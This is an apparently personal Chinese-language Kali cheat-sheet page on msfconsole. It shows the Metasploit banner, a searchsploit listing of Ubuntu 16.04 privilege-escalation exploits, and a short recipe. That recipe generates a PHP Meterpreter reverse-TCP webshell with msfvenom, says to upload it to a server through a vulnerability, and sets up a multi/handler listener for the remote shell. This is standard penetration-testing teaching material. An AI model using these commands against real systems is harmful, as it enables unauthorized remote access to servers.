======================
msfconsole
======================


.. post:: 2023-02-26 21:30:12
  :tags: kali, kali渗透专用指令
  :category: 安全
  :author: YanQue
  :location: CD
  :language: zh-cn


交互式漏洞搜索工具

示例
======================

.. code-block:: sh

	┌──(yanque㉿kali)-[~]
	└─$ msfconsole

	Call trans opt: received. 2-19-98 13:24:18 REC:Loc

		Trace program: running

			wake up, Neo...
			the matrix has you
		follow the white rabbit.

			knock, knock, Neo.

							(`.         ,-,
							` `.    ,;' /
							`.  ,'/ .'
							`. X /.'
					.-;--''--.._` ` (
				.'            /   `
				,           ` '   Q '
				,         ,   `._    \
			,.|         '     `-.;_'
			:  . `  ;    `  ` --,.._;
			' `    ,   )   .'
				`._ ,  '   /_
					; ,''-,;' ``-
					``-..__``--`

								https://metasploit.com


		=[ metasploit v6.2.26-dev                          ]
	+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
	+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
	+ -- --=[ 9 evasion                                       ]

	Metasploit tip: After running db_nmap, be sure to
	check out the result of hosts and services
	Metasploit Documentation: https://docs.metasploit.com/

	msf6 > searchsploit ubuntu 16.04
	[*] exec: searchsploit ubuntu 16.04

	---------------------------------------------- ---------------------------------
	Exploit Title                                |  Path
	---------------------------------------------- ---------------------------------
	Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - L | linux/local/40937.txt
	Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Priv | linux/local/40054.c
	Google Chrome (Fedora 25 / Ubuntu 16.04) - 't | linux/local/40943.txt
	LightDM (Ubuntu 16.04/16.10) - 'Guest Account | linux/local/41923.txt
	Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14. | linux_x86-64/local/42275.c
	Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16 | linux_x86/local/42276.c
	Linux Kernel (Ubuntu 16.04) - Reference Count | linux/dos/39773.txt
	Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) | linux/local/45175.c
	Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local | linux/local/40759.rb
	Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_ | linux/dos/46529.c
	Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64 | linux_x86-64/local/40871.c
	Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Ne | linux_x86-64/local/40049.c
	Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.0 | windows_x86-64/local/47170.c
	Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-f | linux/local/39772.txt
	Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_S | linux/local/40489.txt
	Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp K | linux/dos/45919.c
	Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora  | linux/local/45010.c
	Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - L | linux/local/44298.c
	Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) -  | linux_x86-64/local/44300.c
	Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu  | linux/local/43418.c
	Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/1 | linux/local/47169.c
	---------------------------------------------- ---------------------------------
	Shellcodes: No Results
	msf6 >


.. code-block:: sh

	# 生成木马文件
	msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.142.132 lport=7777 -o shell.php

	# 将木马文件通过漏洞上传到服务器, 然后触发访问

	# 打开交互式msfconsole工具做好监听
	msfconsole

	use exploit/multi/handler
	set payload php/meterpreter/reverse_tcp
	set lhost 192.168.142.132
	set lport 7777
	exploit

lhost
	自己机器的ip

详情见: :doc:`../msf/index`





